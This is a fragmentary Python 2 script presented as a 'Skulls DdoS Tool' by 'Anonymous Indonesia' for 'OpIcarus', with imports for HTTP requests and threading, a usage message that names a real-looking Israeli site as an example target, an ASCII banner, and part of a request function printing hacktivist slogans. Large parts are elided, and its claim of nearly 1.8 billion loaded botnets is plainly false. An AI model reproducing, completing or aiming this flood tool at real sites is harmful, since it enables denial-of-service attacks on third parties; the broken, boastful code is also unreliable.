...
# 
#
# author : Anonymous Indonesia , version 1.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def usage():
	print 'Skulls DdoS Tool ( individual Dangerous Denial of Service )'
	print 'New loaded Botnets: 1,798,445,657'
	print 'Usage: Skulls_Ddos.py (url)'
	print 'Example: Skulls_Ddos.py http://luthi.co.il/'
	print "\a"
print \
"""                        .
             ,----------------,              ,---------,
...
This is Anonymous_Indnesia: OpIcarus has started!
"""
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print "----->>> ! We are Anonymous Indonesia - ExpectUS ! <<<-----"
			code=500
